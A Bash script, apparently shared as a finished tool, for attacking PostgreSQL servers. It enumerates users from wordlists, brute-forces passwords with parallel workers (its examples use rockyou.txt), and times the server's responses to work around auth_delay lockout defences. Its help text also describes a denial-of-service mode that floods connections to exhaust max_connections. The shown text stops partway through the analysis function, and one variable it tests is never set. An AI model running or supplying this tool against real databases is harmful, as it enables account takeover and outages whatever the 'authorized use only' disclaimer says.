#!/bin/bash
# =============================================================================
#  PG_BRUTEFORCE v2.2 - Herramienta de Auditoría Profesional PostgreSQL
#  Autor: Tu nombre aquí
#  Uso: Solo en sistemas con autorización explícita del propietario.
# =============================================================================

# --- Colores ---
GREEN='\033[1;32m'; RED='\033[1;31m'; YELLOW='\033[1;33m'
CYAN='\033[1;36m'; MAGENTA='\033[1;35m'; WHITE='\033[1;37m'
BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

VERSION="2.2"

HOST="127.0.0.1"; PORT="5432"; DB="postgres"
USER_DEFAULT="postgres"; PASS_DEFAULT="check_user_123"
USER_FILE=""; PASS_FILE=""
SKIP_PORT_CHECK=false; QUIET_MODE=false; OUTPUT_FILE=""
EXIT_ON_SUCCESS=false; CLI_TIMEOUT=5; CLI_TIMEOUT_EXPLICIT=false
WORKERS=1; ANALYZE_MODE=false; TIMING_SAMPLES=3; TIMING_THRESHOLD="0.3"

# ── TIMEOUTS SEPARADOS ───────────────────────────────────────────────────────
# MEASURE_TIMEOUT: usado SOLO en modo -A para medir tiempos reales.
# Debe ser alto para capturar la respuesta aunque auth_delay sea grande.
# Es completamente independiente de CLI_TIMEOUT (que es para ataques).
MEASURE_TIMEOUT=60

# PROBE_TIMEOUT: usado para el pre-check de pg_hba en modo ataque (-u/-f).
# Más alto que CLI_TIMEOUT para recibir respuesta real aunque haya delay.
PROBE_TIMEOUT=20

# ── Modo DoS / inundación de conexiones ─────────────────────────────────────
DOS_MODE=false
DOS_RATE=50           # conexiones por segundo (total entre todos los workers)
DOS_MAX_TARGET=110    # objetivo de conexiones para saturar max_connections

# ── SESIÓN EN /tmp (no basura en el home) ────────────────────────────────────
# Archivo temporal con nombre determinístico basado en host:port:db.
# Se elimina automáticamente cuando el ataque lo consume o cuando -A regenera.
SESSION_BASE_DIR="/tmp"
SESSION_FILE=""
SESSION_SUGGESTED_TIMEOUT=""; SESSION_HBA_ACEPTA_TODOS=""
SESSION_DELAY_TIPO=""; SESSION_TIMESTAMP=""

TEMP_DIR=$(mktemp -d /tmp/pg_bf_XXXXXX)
LOCK_FILE="$TEMP_DIR/output.lock"; OUT_LOCK="$TEMP_DIR/outfile.lock"
SUCCESS_FLAG="$TEMP_DIR/success.flag"

cleanup() {
    jobs -p 2>/dev/null | xargs -r kill 2>/dev/null
    wait 2>/dev/null; rm -rf "$TEMP_DIR" 2>/dev/null
}
trap cleanup EXIT INT TERM

# =============================================================================
# BANNER Y AYUDA
# =============================================================================

mostrar_banner() {
    echo -e "${CYAN}"
    echo "  ██████   ██████     ██████  ██████  ██    ██ ████████ ███████"
    echo "  ██   ██ ██         ██   ██ ██   ██ ██    ██    ██    ██     "
    echo "  ██████  ██   ███   ██████  ██████  ██    ██    ██    █████  "
    echo "  ██      ██    ██   ██   ██ ██   ██ ██    ██    ██    ██     "
    echo "  ██       ██████    ██████  ██   ██  ██████     ██    ███████"
    echo -e "${WHITE}             v${VERSION} — Auditoría Profesional PostgreSQL${NC}"
    echo -e "${RED}  [!] Solo para uso ético y con autorización explícita del propietario.${NC}"
    echo ""
}

mostrar_ayuda() {
    mostrar_banner
    echo -e "${WHITE}${BOLD}USO:${NC}  $0 [opciones]\n"
    echo -e "${CYAN}${BOLD}CONEXIÓN:${NC}"
    printf "  %-18s %s\n" "-h <host>" "Host PostgreSQL.                     [Default: 127.0.0.1]"
    printf "  %-18s %s\n" "-p <port>" "Puerto.                              [Default: 5432]"
    printf "  %-18s %s\n" "-d <db>"   "Base de datos.                       [Default: postgres]"
    echo -e "\n${CYAN}${BOLD}ATAQUE:${NC}"
    printf "  %-18s %s\n" "-u <file>" "Archivo de usuarios (enumeración)."
    printf "  %-18s %s\n" "-f <file>" "Archivo de contraseñas (fuerza bruta)."
    printf "  %-18s %s\n" "-U <user>" "Usuario objetivo para -f.            [Default: postgres]"
    printf "  %-18s %s\n" "-P <pass>" "Contraseña base para -u."
    echo -e "\n${CYAN}${BOLD}RENDIMIENTO Y PARALELISMO:${NC}"
    printf "  %-18s %s\n" "-w <num>"  "Workers paralelos sin límite.        [Default: 1]"
    printf "  %-18s %s\n" "-T <seg>"  "Timeout por intento (seg). Si hay sesión y no se"
    echo    "                     especifica -T, se usa el timeout del análisis previo."
    echo    "                     Usar -T bajo para bypassear auth_delay (ej: -T 0.5)"
    echo -e "\n${CYAN}${BOLD}ANÁLISIS DE TIMING:${NC}"
    printf "  %-18s %s\n" "-A"        "Modo Análisis — detecta delay y tipo pg_hba."
    printf "  %-18s %s\n" ""          "  Usa timeout interno de ${MEASURE_TIMEOUT}s para medir con precisión"
    printf "  %-18s %s\n" ""          "  aunque haya auth_delay configurado."
    printf "  %-18s %s\n" "-n <num>"  "Muestras para promediar tiempos.     [Default: 3]"
    printf "  %-18s %s\n" "-D <seg>"  "Umbral de detección de delay.        [Default: 0.3s]"
    echo -e "\n${CYAN}${BOLD}DoS — INUNDACIÓN DE CONEXIONES:${NC}"
    printf "  %-18s %s\n" "-Z"       "Modo DoS: inunda el servidor con conexiones fallidas."
    printf "  %-18s %s\n" "-r <n>"   "Conexiones por segundo (total).      [Default: 50]"
    printf "  %-18s %s\n" "-M <n>"   "Objetivo de conexiones a saturar.    [Default: 110]"
    printf "  %-18s %s\n" ""         "  Combinar con -w para workers paralelos (Default: 1)."
    printf "  %-18s %s\n" ""         "  Ej: $0 -h 10.0.0.1 -Z -r 100 -M 105 -w 20"

    echo -e "\n${CYAN}${BOLD}EXTRAS:${NC}"
    printf "  %-18s %s\n" "-S"        "Saltar validación de puerto TCP."
    printf "  %-18s %s\n" "-q"        "Modo silencioso: solo muestra hallazgos [->]."
    printf "  %-18s %s\n" "-x"        "Finalizar al primer acierto encontrado."
    printf "  %-18s %s\n" "-o <file>" "Guardar resultados en archivo con timestamps."
    printf "  %-18s %s\n" "-H"        "Mostrar este menú."
    echo -e "\n${CYAN}${BOLD}FLUJO RECOMENDADO:${NC}"
    echo -e "  ${DIM}# 1. Analizar el servidor (crea sesión en /tmp):${NC}"
    echo    "  $0 -h 10.0.0.1 -A -U postgres -n 5"
    echo -e "  ${DIM}# 2. El ataque usa el timeout de sesión automáticamente:${NC}"
    echo    "  $0 -h 10.0.0.1 -u users.txt -w 16"
    echo    "  $0 -h 10.0.0.1 -U postgres -f rockyou.txt -w 8 -x -o result.log"
    echo ""
    exit 0
}

# =============================================================================
# ARGUMENTOS
# =============================================================================

while getopts "h:p:d:U:P:u:f:So:qxHT:w:An:D:Zr:M:" opt; do
    case $opt in
        h) HOST=$OPTARG ;; p) PORT=$OPTARG ;; d) DB=$OPTARG ;;
        U) USER_DEFAULT=$OPTARG ;; P) PASS_DEFAULT=$OPTARG ;;
        u) USER_FILE=$OPTARG ;; f) PASS_FILE=$OPTARG ;;
        S) SKIP_PORT_CHECK=true ;; q) QUIET_MODE=true ;;
        x) EXIT_ON_SUCCESS=true ;; o) OUTPUT_FILE=$OPTARG ;;
        T) CLI_TIMEOUT=$OPTARG; CLI_TIMEOUT_EXPLICIT=true ;;
        w) WORKERS=$OPTARG ;; A) ANALYZE_MODE=true ;;
        n) TIMING_SAMPLES=$OPTARG ;; D) TIMING_THRESHOLD=$OPTARG ;;
        Z) DOS_MODE=true ;;
        r) DOS_RATE=$OPTARG ;;
        M) DOS_MAX_TARGET=$OPTARG ;;
        H) mostrar_ayuda ;; *) mostrar_ayuda ;;
    esac
done

# Ruta de sesión determinística: /tmp/pg_bf_session_HOST_PORT_DB
SESSION_FILE="${SESSION_BASE_DIR}/pg_bf_session_$(echo "${HOST}_${PORT}_${DB}" | tr './:' '_').cfg"

# =============================================================================
# LOGGING (thread-safe con flock)
# =============================================================================

log_msg() {
    local TIPO="$1" MSG="$2" COLOR="$3" PREFIJO="$4" TIEMPO="$5" STR_TIEMPO=""
    [[ -n "$TIEMPO" ]] && STR_TIEMPO=" [${TIEMPO}s]"
    if [ "$QUIET_MODE" = false ] || [ "$TIPO" = "SUCCESS" ]; then
        ( flock -x 200; echo -e "${COLOR}${PREFIJO}${STR_TIEMPO} ${MSG}${NC}" ) 200>"$LOCK_FILE"
    fi
    if [[ -n "$OUTPUT_FILE" ]]; then
        ( flock -x 201
          echo "[$(date +'%Y-%m-%d %H:%M:%S')] [$TIPO]${STR_TIEMPO} $MSG" >> "$OUTPUT_FILE"
        ) 201>"$OUT_LOCK"
    fi
}

# =============================================================================
# SESIÓN PERSISTENTE EN /tmp
# =============================================================================

generar_usuario_falso() {
    local rnd
    rnd=$(cat /dev/urandom 2>/dev/null | tr -dc 'a-z0-9' | head -c 12 2>/dev/null)
    [[ -z "$rnd" ]] && rnd="xrnd$(date +%N | tail -c 6)"
    echo "pgbf_probe_${rnd}"
}

guardar_sesion() {
    # $1=SUGGESTED_TIMEOUT  $2=HBA_ACEPTA_TODOS  $3=DELAY_TIPO
    cat > "$SESSION_FILE" << EOF
# PG_BRUTEFORCE Session v2.2
HOST=$HOST
PORT=$PORT
DB=$DB
SUGGESTED_TIMEOUT=$1
HBA_ACEPTA_TODOS=$2
DELAY_TIPO=$3
TIMESTAMP=$(date +'%Y-%m-%d %H:%M:%S')
EOF
    echo -e "${GREEN}[✔] Sesión guardada en: ${WHITE}$SESSION_FILE${NC}"
    echo -e "${DIM}    (se elimina automáticamente al ejecutar -u / -f)${NC}"
}

cargar_sesion() {
    [[ ! -f "$SESSION_FILE" ]] && return 1
    local s_host s_port s_db
    s_host=$(grep "^HOST=" "$SESSION_FILE" | cut -d= -f2)
    s_port=$(grep "^PORT=" "$SESSION_FILE" | cut -d= -f2)
    s_db=$(grep   "^DB="   "$SESSION_FILE" | cut -d= -f2)
    [[ "$s_host" != "$HOST" || "$s_port" != "$PORT" || "$s_db" != "$DB" ]] && return 1
    SESSION_SUGGESTED_TIMEOUT=$(grep "^SUGGESTED_TIMEOUT=" "$SESSION_FILE" | cut -d= -f2)
    SESSION_HBA_ACEPTA_TODOS=$(grep  "^HBA_ACEPTA_TODOS="  "$SESSION_FILE" | cut -d= -f2)
    SESSION_DELAY_TIPO=$(grep        "^DELAY_TIPO="         "$SESSION_FILE" | cut -d= -f2)
    SESSION_TIMESTAMP=$(grep         "^TIMESTAMP="          "$SESSION_FILE" | cut -d= -f2-)
    return 0
}

eliminar_sesion() {
    if [[ -f "$SESSION_FILE" ]]; then
        rm -f "$SESSION_FILE" 2>/dev/null
        [ "$QUIET_MODE" = false ] && \
            echo -e "${DIM}[*] Sesión eliminada: $SESSION_FILE${NC}"
    fi
}

mostrar_sesion_cargada() {
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}${BOLD}║           SESIÓN PREVIA DETECTADA (-A)               ║${NC}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════╝${NC}"
    printf "  ${WHITE}%-28s${CYAN}%s${NC}\n" "Analizado el:"        "$SESSION_TIMESTAMP"
    printf "  ${WHITE}%-28s${CYAN}%s${NC}\n" "Tipo de delay:"       "$SESSION_DELAY_TIPO"
    printf "  ${WHITE}%-28s${CYAN}%s${NC}\n" "pg_hba acepta todos:" "$SESSION_HBA_ACEPTA_TODOS"
    printf "  ${WHITE}%-28s${CYAN}%s${NC}\n" "Timeout sugerido:"    "${SESSION_SUGGESTED_TIMEOUT}s"
    if [ "$CLI_TIMEOUT_EXPLICIT" = false ] && [[ -n "$SESSION_SUGGESTED_TIMEOUT" ]]; then
        printf "  ${GREEN}%-28s${GREEN}%s${NC}\n" "→ Aplicando timeout:" \
               "${SESSION_SUGGESTED_TIMEOUT}s  (sesión — usa -T para sobreescribir)"
    else
        printf "  ${YELLOW}%-28s${YELLOW}%s${NC}\n" "→ Timeout manual:" \
               "${CLI_TIMEOUT}s  (sobreescribe la sesión)"
    fi
    echo ""
}

# =============================================================================
# PRE-CHECK pg_hba
#
# IMPORTANTE: en modo -A se llama con MEASURE_TIMEOUT para recibir la respuesta
# real aunque haya auth_delay configurado.
# En modo ataque se llama con PROBE_TIMEOUT (20s), más alto que CLI_TIMEOUT.
#
# Si el usuario ficticio recibe "password authentication failed":
#   → pg_hba tiene USER=all → cualquier nombre llega a autenticación → retorna 0
# Si recibe "no pg_hba.conf entry":
#   → pg_hba es selectivo → retorna 1
# Si hace timeout incluso con PROBE_TIMEOUT:
#   → auth_delay muy alto y pg_hba probablemente tiene all → retorna 2
#
# Retorna: 0=acepta todos, 1=selectivo, 2=indeterminado
# =============================================================================

verificar_hba_acepta_todos() {
    local probe_to="${1:-$PROBE_TIMEOUT}"   # timeout a usar para este probe
    local fake_user; fake_user=$(generar_usuario_falso)
    local fake_pass="Pr0b3_$(date +%N | tail -c 5)"
    local RES
    RES=$(PGPASSWORD="$fake_pass" timeout "${probe_to}s" psql \
        -h "$HOST" -p "$PORT" -d "$DB" -U "$fake_user" -c "SELECT 1" 2>&1)
    local status=$?
    if   [ "$status" -eq 124 ];                              then return 2
    elif [[ "$RES" == *"password authentication failed"* ]]; then return 0
    elif [[ "$RES" == *"no pg_hba.conf entry"* ]];           then return 1
    elif [[ "$RES" == *"role"*"does not exist"* ]];          then return 1
    elif [[ "$RES" == *"Connection refused"* ]] || [[ "$RES" == *"could not connect"* ]]; then return 2
    else return 2
    fi
}

advertencia_hba_acepta_todos() {
    local modo="${1:-abort}" fake_user="${2:-pgbf_probe_xxx}"
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║    ⚠  ADVERTENCIA: ENUMERACIÓN DE USUARIOS INÚTIL  ⚠        ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${WHITE}El servidor respondió ${YELLOW}\"password authentication failed\"${WHITE} para el"
    echo -e "  usuario ficticio: ${CYAN}${fake_user}${NC}"
    echo ""
    echo -e "  ${WHITE}En ${CYAN}pg_hba.conf${WHITE} la columna USER está como ${YELLOW}all${WHITE} — PostgreSQL"
    echo -e "  pasa CUALQUIER nombre a autenticación."
    echo ""
    echo -e "  ${WHITE}${BOLD}Resultado:${NC} Todos responderán ${GREEN}\"requiere contraseña\"${NC} existan o no."
    echo -e "  ${RED}No es posible distinguir un usuario real de uno inventado.${NC}"
    echo ""
    echo -e "  ${WHITE}${BOLD}¿Qué hacer?${NC}"
    echo -e "  → Ataca contraseñas de un usuario conocido (ej: postgres):"
    echo -e "    ${CYAN}$0 -h $HOST -p $PORT -U postgres -f <wordlist> -w 8${NC}"
    echo -e "  → Corre primero ${CYAN}-A${WHITE} para obtener el timeout óptimo."
    echo ""
    if [ "$modo" = "abort" ]; then
        echo -e "  ${RED}${BOLD}[ABORTADO] La enumeración de usuarios ha sido cancelada.${NC}"
        echo ""
    fi
}

# =============================================================================
# DEPENDENCIAS Y PUERTO
# =============================================================================

verificar_dependencias() {
    local missing=()
    for cmd in psql bc timeout flock; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[ERROR] Dependencias faltantes: ${missing[*]}${NC}"
        echo -e "${YELLOW}  Instalar: sudo apt install postgresql-client bc coreutils util-linux${NC}"
        exit 1
    fi
}

validar_puerto() {
    [ "$QUIET_MODE" = false ] && echo -ne "${CYAN}[*] Validando alcance a $HOST:$PORT ... ${NC}"
    if ! timeout 3s bash -c "echo > /dev/tcp/$HOST/$PORT" 2>/dev/null; then
        echo ""; log_msg "ERROR" "No hay alcance al puerto $PORT en $HOST." "$RED" "[X]"; exit 1
    fi
    [ "$QUIET_MODE" = false ] && echo -e "${GREEN}OK${NC}"
}

# =============================================================================
# MEDICIÓN DE TIEMPOS
#
# medir_tiempo_respuesta SIEMPRE recibe el timeout a usar como tercer parámetro.
# En modo -A se pasa MEASURE_TIMEOUT (60s) → medición exacta del delay real.
# =============================================================================

medir_tiempo_respuesta() {
    local username="$1" password="$2" mto="${3:-$MEASURE_TIMEOUT}"
    local samples="${4:-$TIMING_SAMPLES}" total="0"
    for ((i=0; i<samples; i++)); do
        local t_start t_end elapsed
        t_start=$(date +%s%N)
        PGPASSWORD="$password" timeout "${mto}s" psql \
            -h "$HOST" -p "$PORT" -d "$DB" -U "$username" -c "SELECT 1" >/dev/null 2>&1
        t_end=$(date +%s%N)
        elapsed=$(echo "scale=6; ($t_end - $t_start) / 1000000000" | bc)
        total=$(echo "scale=6; $total + $elapsed" | bc)
    done
    echo "scale=4; $total / $samples" | bc
}

medir_tcp() {
    local samples="${1:-$TIMING_SAMPLES}" total="0"
    for ((i=0; i<samples; i++)); do
        local t_start t_end elapsed
        t_start=$(date +%s%N)
        timeout 3s bash -c "echo > /dev/tcp/$HOST/$PORT" 2>/dev/null
        t_end=$(date +%s%N)
        elapsed=$(echo "scale=6; ($t_end - $t_start) / 1000000000" | bc)
        total=$(echo "scale=6; $total + $elapsed" | bc)
    done
    echo "scale=4; $total / $samples" | bc
}

# =============================================================================
# MODO ANÁLISIS — TÉCNICA DE LOS TRES TIEMPOS
#
# LÓGICA DE SUGGESTED_TIMEOUT:
#
# NINGUNO  → TCP ≈ 0.001s | T_FAKE ≈ 0.015s | T_TARGET ≈ 0.015s
#            Servidor rápido. Suggested = 2.0s (margen cómodo)
#
# SELECTIVO → TCP ≈ 0.001s | T_FAKE ≈ 0.015s | T_TARGET ≈ 10s
#             Solo usuarios reales tienen delay. Hay DOS timeouts:
#             - BYPASS   = T_FAKE + 0.3s  → ficticios responden, reales hacen timeout
#             - BRUTE    = T_TARGET + 2.0s → espera la respuesta completa del delay
#             Se guarda BRUTE como default en sesión.
#
# GLOBAL   → TCP ≈ 0.001s | T_FAKE ≈ 10s | T_TARGET ≈ 10s
#            auth_delay aplica a todos los intentos fallidos.
#            Suggested = T_FAKE + 2.0s  (T_FAKE ES el delay real medido)
#            ← ESTE ERA EL BUG: antes usaba T_TARGET + 1.0 que es lo mismo
#              pero mal nombrado, ahora usa T_FAKE para dejar claro el razonamiento.
#
# ACTIVO   → T_FAKE < T_TARGET ≈ crece
#            Penalización progresiva (credcheck). Suggested = T_TARGET2 + 3.0s
# =============================================================================

modo_analisis() {
    local FAKE_USER FAKE_PASS
    FAKE_USER=$(generar_usuario_falso)
    FAKE_PASS="Pr0b3_$(cat /dev/urandom 2>/dev/null | tr -dc 'A-Za-z0-9' | head -c 10 2>/dev/null || date +%N)"

    echo -e "\n${CYAN}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}${BOLD}║        ANÁLISIS DE TIMING — TÉCNICA TRES TIEMPOS         ║${NC}"
    echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}\n"
    echo -e "  ${WHITE}Servidor:              ${CYAN}$HOST:$PORT${NC}"
    echo -e "  ${WHITE}Base de datos:         ${CYAN}$DB${NC}"
    echo -e "  ${WHITE}Usuario objetivo:      ${CYAN}$USER_DEFAULT${NC}"
    echo -e "  ${WHITE}Muestras/medición:     ${CYAN}$TIMING_SAMPLES${NC}"
    echo -e "  ${WHITE}Umbral de delay:       ${CYAN}${TIMING_THRESHOLD}s${NC}"
    echo -e "  ${WHITE}Timeout de medición:   ${CYAN}${MEASURE_TIMEOUT}s${WHITE} (independiente de -T)${NC}"
    echo -e "  ${WHITE}Sesión temporal:       ${CYAN}${SESSION_FILE}${NC}\n"

    # ── PASO 1: Baseline TCP ────────────────────────────────────────────────
    echo -e "${CYAN}${BOLD}[PASO 1/3]${NC} Midiendo latencia TCP (baseline de red)..."
    local T_TCP; T_TCP=$(medir_tcp "$TIMING_SAMPLES")
    echo -e "  ${GREEN}↳ TCP promedio: ${WHITE}${T_TCP}s${NC}\n"

    # ── PASO 2: Usuario INEXISTENTE ─────────────────────────────────────────
    # Una sola conexión captura la respuesta real de pg_hba Y el tiempo.
    # Con MEASURE_TIMEOUT=60s recibimos la respuesta aunque haya auth_delay alto.
    echo -e "${CYAN}${BOLD}[PASO 2/3]${NC} Midiendo respuesta con usuario INEXISTENTE..."
    echo -e "  ${DIM}→ Usuario: ${FAKE_USER} | Timeout medición: ${MEASURE_TIMEOUT}s${NC}"

    local HBA_TODOS=false
    local RES_FAKE
    local t2_start t2_end t2_elapsed
    t2_start=$(date +%s%N)
    RES_FAKE=$(PGPASSWORD="$FAKE_PASS" timeout "${MEASURE_TIMEOUT}s" psql \
        -h "$HOST" -p "$PORT" -d "$DB" -U "$FAKE_USER" -c "SELECT 1" 2>&1)
    local fake_status=$?
    t2_end=$(date +%s%N)
    t2_elapsed=$(echo "scale=6; ($t2_end - $t2_start) / 1000000000" | bc)

    # Determinar comportamiento de pg_hba desde la respuesta capturada
    if [ "$fake_status" -eq 124 ]; then
        echo -e "  ${YELLOW}[?] Timeout en medición — delay extremadamente alto o problema de red.${NC}\n"
    elif [[ "$RES_FAKE" == *"password authentication failed"* ]]; then
        HBA_TODOS=true
        advertencia_hba_acepta_todos "warn" "$FAKE_USER"
        echo -e "${YELLOW}  ⚠  El análisis continúa para medir tiempos, pero la enumeración${NC}"
        echo -e "${YELLOW}     de usuarios NO funcionará con esta configuración de pg_hba.${NC}\n"
    elif [[ "$RES_FAKE" == *"no pg_hba.conf entry"* ]]; then
        echo -e "  ${GREEN}  [✔] pg_hba SELECTIVO — enumeración de usuarios SÍ puede funcionar.${NC}"
    elif [[ "$RES_FAKE" == *"role"*"does not exist"* ]]; then
        echo -e "  ${GREEN}  [✔] Auth method delata existencia de usuarios (pg_hba pasó el usuario).${NC}"
    else
        echo -e "  ${YELLOW}  [?] Respuesta: $(echo "$RES_FAKE" | head -1)${NC}"
    fi

    # Medir promedio con las muestras configuradas (incluye el primer intento)
    local T_FAKE
    if [ "$TIMING_SAMPLES" -gt 1 ]; then
        local extra_samples=$((TIMING_SAMPLES - 1))
        local extra_total="0"
        for ((i=0; i<extra_samples; i++)); do
            local ts te el
            ts=$(date +%s%N)
            PGPASSWORD="$FAKE_PASS" timeout "${MEASURE_TIMEOUT}s" psql \
                -h "$HOST" -p "$PORT" -d "$DB" -U "$FAKE_USER" -c "SELECT 1" >/dev/null 2>&1
            te=$(date +%s%N)
            el=$(echo "scale=6; ($te - $ts) / 1000000000" | bc)
            extra_total=$(echo "scale=6; $extra_total + $el" | bc)
        done
        T_FAKE=$(echo "scale=4; ($t2_elapsed + $extra_total) / $TIMING_SAMPLES" | bc)
    else
        T_FAKE=$(echo "scale=4; $t2_elapsed" | bc)
    fi
    echo -e "  ${GREEN}↳ Tiempo promedio: ${WHITE}${T_FAKE}s${NC}\n"

    # ── PASO 3: Usuario OBJETIVO ─────────────────────────────────────────────
    # Capturamos la respuesta real primero para validar que el usuario efectivamente
    # llega a la fase de autenticación. Si pg_hba lo rechaza antes, el tiempo
    # medido no es útil para el análisis de timing.
    echo -e "${CYAN}${BOLD}[PASO 3/3]${NC} Midiendo respuesta con usuario OBJETIVO (${USER_DEFAULT})..."
    echo -e "  ${DIM}→ Timeout medición: ${MEASURE_TIMEOUT}s${NC}"

    local TARGET_VALIDO=true
    local RES_TARGET
    local t3_start t3_end t3_elapsed
    t3_start=$(date +%s%N)
    RES_TARGET=$(PGPASSWORD="$FAKE_PASS" timeout "${MEASURE_TIMEOUT}s" psql \
        -h "$HOST" -p "$PORT" -d "$DB" -U "$USER_DEFAULT" -c "SELECT 1" 2>&1)
    local target_status=$?
    t3_end=$(date +%s%N)
    t3_elapsed=$(echo "scale=6; ($t3_end - $t3_start) / 1000000000" | bc)

    if [[ "$RES_TARGET" == *"no pg_hba.conf entry"* ]]; then
        TARGET_VALIDO=false
        echo -e "  ${RED}${BOLD}[!!] MEDICIÓN INVÁLIDA — usuario '${USER_DEFAULT}' rechazado por pg_hba.conf${NC}"
        echo -e "  ${RED}     El servidor bloqueó la conexión ANTES de llegar a autenticación.${NC}"
        echo -e "  ${RED}     pg_hba.conf no tiene una regla que permita este usuario desde esta IP.${NC}"
        echo -e "  ${YELLOW}     → El tiempo medido refleja el rechazo de red, NO un delay de auth.${NC}"
        echo -e "  ${YELLOW}     → Usa -U con un usuario que sí tenga entrada en pg_hba.conf${NC}"
        echo -e "  ${YELLOW}       (por ejemplo, uno que cuando conectas te pida contraseña).${NC}\n"
    elif [[ "$RES_TARGET" == *"password authentication failed"* ]]; then
        echo -e "  ${GREEN}  [✔] Usuario llegó a fase de autenticación — medición válida.${NC}"
    elif [ "$target_status" -eq 124 ]; then
        echo -e "  ${CYAN}  [✔] Timeout — usuario probablemente existe con auth_delay activo.${NC}"
    elif [[ "$RES_TARGET" == *"SELECT 1"* ]]; then
        echo -e "  ${GREEN}  [✔] Acceso directo sin contraseña — medición válida.${NC}"
    else
        echo -e "  ${YELLOW}  [?] Respuesta: $(echo "$RES_TARGET" | head -1)${NC}"
    fi

    # Medir promedio con las muestras configuradas (incluye el primer intento)
    local T_TARGET
    if [ "$TIMING_SAMPLES" -gt 1 ] && [ "$TARGET_VALIDO" = true ]; then
        local extra_samples=$((TIMING_SAMPLES - 1))
        local extra_total="0"
        for ((i=0; i<extra_samples; i++)); do
            local ts te el
            ts=$(date +%s%N)
            PGPASSWORD="$FAKE_PASS" timeout "${MEASURE_TIMEOUT}s" psql \
                -h "$HOST" -p "$PORT" -d "$DB" -U "$USER_DEFAULT" -c "SELECT 1" >/dev/null 2>&1
            te=$(date +%s%N)
            el=$(echo "scale=6; ($te - $ts) / 1000000000" | bc)
            extra_total=$(echo "scale=6; $extra_total + $el" | bc)
        done
        T_TARGET=$(echo "scale=4; ($t3_elapsed + $extra_total) / $TIMING_SAMPLES" | bc)
    else
        T_TARGET=$(echo "scale=4; $t3_elapsed" | bc)
    fi
    echo -e "  ${GREEN}↳ Tiempo promedio: ${WHITE}${T_TARGET}s${NC}\n"

    local DIFF; DIFF=$(echo "scale=4; $T_TARGET - $T_FAKE" | bc)

    # ── Resumen ─────────────────────────────────────────────────────────────
    echo -e "${WHITE}${BOLD}─────────────────── RESUMEN DE MEDICIONES ─────────────────────${NC}"
    printf "  %-44s ${CYAN}%s${NC}\n" "Tiempo TCP (baseline red):"          "${T_TCP}s"
    printf "  %-44s ${CYAN}%s${NC}\n" "Tiempo usuario INEXISTENTE:"          "${T_FAKE}s"
    printf "  %-44s ${CYAN}%s${NC}\n" "Tiempo usuario OBJETIVO ($USER_DEFAULT):" "${T_TARGET}s"
    [ "$TARGET_VALIDO" = false ] && echo -e "  ${RED}  ↳ ⚠  INVÁLIDO — rechazado por pg_hba antes de autenticación${NC}"
    printf "  %-44s ${YELLOW}%s${NC}\n" "Diferencia (objetivo - inexistente):" "${DIFF}s"
    printf "  %-44s ${YELLOW}%s${NC}\n" "Umbral de detección:"                 "${TIMING_THRESHOLD}s"
    printf "  %-44s ${YELLOW}%s${NC}\n" "pg_hba acepta todos (USER=all):" \
           "$( [ "$HBA_TODOS" = true ] && echo 'SÍ ⚠' || echo 'No')"
    echo ""

    # ── Interpretación y cálculo de SUGGESTED_TIMEOUT ───────────────────────
    local DIFF_SIG FAKE_HIGH TARGET_HIGH
    local SUGGESTED_T SUGGESTED_T_BYPASS DELAY_TIPO

    # Si TARGET_VALIDO=false, el paso 3 no aporta datos de timing útiles.
    # Solo podemos concluir lo que nos dijo el paso 2 (HBA_TODOS) y el TCP.
    if [ "$TARGET_VALIDO" = false ]; then
        echo -e "${YELLOW}${BOLD}[!] ANÁLISIS DE DELAY INCOMPLETO${NC}"
        echo -e "${YELLOW}    El usuario objetivo fue rechazado por pg_hba antes de autenticación.${NC}"
        echo -e "${YELLOW}    No es posible determinar si hay auth_delay ni medir delay selectivo.${NC}"
        echo -e "${YELLOW}    → Vuelve a ejecutar -A con -U <usuario_que_pida_contraseña>.${NC}\n"
        DELAY_TIPO="indeterminado"
        SUGGESTED_T=$(echo "scale=2; $T_TCP + 0.5" | bc)
        SUGGESTED_T_BYPASS="N/A"
    elif [ "$DIFF_SIG" = "1" ]; then
        # ── SELECTIVO: el delay solo afecta a usuarios que existen
        # T_FAKE es pequeño (~0.015s) → no hay delay para ficticios
        # T_TARGET es grande (~10s)   → auth_delay aplica al usuario real
        echo -e "${GREEN}${BOLD}[✔] DELAY SELECTIVO${NC}"
        echo -e "${GREEN}    El usuario '${USER_DEFAULT}' EXISTE — el servidor solo aplica${NC}"
        echo -e "${GREEN}    auth_delay cuando el nombre de usuario es válido en el catálogo.${NC}"
        DELAY_TIPO="selectivo"

        # Test de penalización progresiva (credcheck)
        echo -e "\n${CYAN}[*] Verificando penalización progresiva (credcheck)...${NC}"
        local T_TARGET2; T_TARGET2=$(medir_tiempo_respuesta "$USER_DEFAULT" "${FAKE_PASS}2" "$MEASURE_TIMEOUT" 1)
        local INCR; INCR=$(echo "scale=4; $T_TARGET2 - $T_TARGET" | bc)
        local IS_GROWING; IS_GROWING=$(echo "$INCR > 0.8" | bc -l 2>/dev/null)

        if [ "$IS_GROWING" = "1" ]; then
            echo -e "${RED}${BOLD}[!!] DEFENSA ACTIVA — PENALIZACIÓN PROGRESIVA (credcheck)${NC}"
            echo -e "${RED}     1er intento: ${T_TARGET}s → 2do: ${T_TARGET2}s (Δ ${INCR}s)${NC}"
            echo -e "${RED}     RIESGO DE LOCKOUT: usa -w 1 y timeout alto.${NC}"
            DELAY_TIPO="activo"
            SUGGESTED_T=$(echo "scale=2; $T_TCP + 1.0" | bc)
            SUGGESTED_T_BYPASS="N/A (penalización progresiva — bypass no recomendado)"
        else
            echo -e "${GREEN}     Sin penalización progresiva.${NC}"
            # BYPASS: timeout MENOR al delay → ficticios [X] rápido, reales [!] TIMEOUT
            SUGGESTED_T_BYPASS=$(echo "scale=2; $T_TCP + 0.3" | bc)
            SUGGESTED_T=$(echo "scale=2; $T_TCP + 0.5" | bc)
        fi

